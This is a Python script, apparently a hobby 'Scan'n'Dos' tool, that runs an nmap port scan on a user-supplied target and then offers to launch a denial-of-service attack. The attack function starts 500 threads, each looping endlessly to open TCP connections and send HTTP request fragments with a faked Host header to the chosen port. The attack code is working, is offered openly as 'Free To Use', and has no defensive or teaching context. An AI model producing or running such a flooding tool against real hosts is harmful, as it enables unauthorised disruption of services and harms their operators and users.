import sys
import nmap
import socket
import threading
import os

print(r"""
__________  ____________________________________________________________
__  ____/ \/ /_  ___/__  ____/_  ____/__  __/_  __ \_  __ \__  /__  ___/
_  /    __  /_____ \__  __/  _  /    __  /  _  / / /  / / /_  / _____ \ 
/ /___  _  / ____/ /_  /___  / /___  _  /   / /_/ // /_/ /_  /______/ / 
\____/  /_/  /____/ /_____/  \____/  /_/    \____/ \____/ /_____/____/""")

def nmapScript():
    def banner():
        print(r"""
___________________________   _________   ___________________________
__  ___/_  ____/__    |__  | / /( )__  | / /( )__  __ \_  __ \_  ___/
_____ \_  /    __  /| |_   |/ /_|/__   |/ /_|/__  / / /  / / /____ \ 
____/ // /___  _  ___ |  /|  /    _  /|  /    _  /_/ // /_/ /____/ / 
/____/ \____/  /_/  |_/_/ |_/     /_/ |_/     /_____/ \____/ /____/""")
        print("_" * 40)
        print("\n - [+] Made By <CYSECTOOLS> ")
        print("\n - [+] Date Of Creation <08.11.24> ")
        print("\n - [+] Usage <Free To Use> ")
        print("\n - [+] Feel Free To Visit My Site:\n       <https://cysectools.com> ")
        print("_" * 40)
    while True:
     print(banner())
     print(" Type (s) to start.\n Type (q) to quit.\n Type (h) for help.\n")
     text1 = input("Enter selection: ")
     if text1 == "s" or text1 == "S":
        print("Starting...")
        scanner = nmap.PortScanner()
        target = input("Enter IP address or hostname of target: ")
        print("Scanning...\nThis may take a while...")
        scanner.scan(target)
        for host in scanner.all_hosts():
            print("Host: ", host, "\n")
            print("State: ", scanner[host].state(), "\n")
            for proto in scanner[host].all_protocols():
                print("Protocol:", proto, "\n")
                ports = scanner[host][proto].keys()
                for port in ports:
                    print("Port: ", port, "State: ", scanner[host][proto][port]['state'], "\n")

        def overload():
            print("_" * 40)
            print(r"""
   ____                  __                __
  / __ \_   _____  _____/ /___  ____ _____/ /
 / / / / | / / _ \/ ___/ / __ \/ __ `/ __  / 
/ /_/ /| |/ /  __/ /  / / /_/ / /_/ / /_/ /  
\____/ |___/\___/_/  /_/\____/\__,_/\__,_/""" + "\n")

            port = int(input("Enter the port number: "))
            fakeip = input("Enter the fake IP address: ")

            # Overload Script {Attack Section}

            def attack():
                already_connected = 0
                while True:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target, port))
                    s.sendto(("Get /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
                    s.sendto(("Host: " + fakeip + "\r\n").encode("ascii"), (target, port))
                    s.close()

                    # global already_connected
                    already_connected += 1
                    print(already_connected)

            for f in range(500):
                thread = threading.Thread(target=attack)
                thread.start()

        text2 = input("Would you like to 'Dos' this target? (Y/N) ")
        if text2 == 'y' or text2 == 'Y':
            overload()
        else:
            print("Goodbye")


     elif text1 == "h" or text1 == "H":
        print("Helping...\n")
        print("Upon entering the IP or Hostname of target, the tool will scan and return the basic information of said target.\n Such as (Host), (Protocol), and (Ports)\n From there, you can continue to the 'Dos' program or quit. ")
        uask = input("Would you like to return? ")
        if uask == "y" or uask == "Y" or uask == "yes" or uask == "Yes":
            print("Okay. Returning...\n")
            continue
     elif text1 == "q" or text1 == "Q\n":
         uaskq = input("Are you sure you want to quit this program? ")
         if uaskq == "y" or uaskq == "Y" or uaskq == "yes" or uaskq == "Yes":
             print("Quitting...")
             break

     else:
        print("Invalid input!\n")
        continue

if __name__ == "__main__":
    print("_" * 50)
    quest = input("Press 'S' to go to ""Scan'n'Dos"" or 'Q' to quit! ")
    print("_" * 50)

    if quest == "S" or quest == "s":
        print("\n")
        nmapScript()
    else:
        print("Goodbye!\n")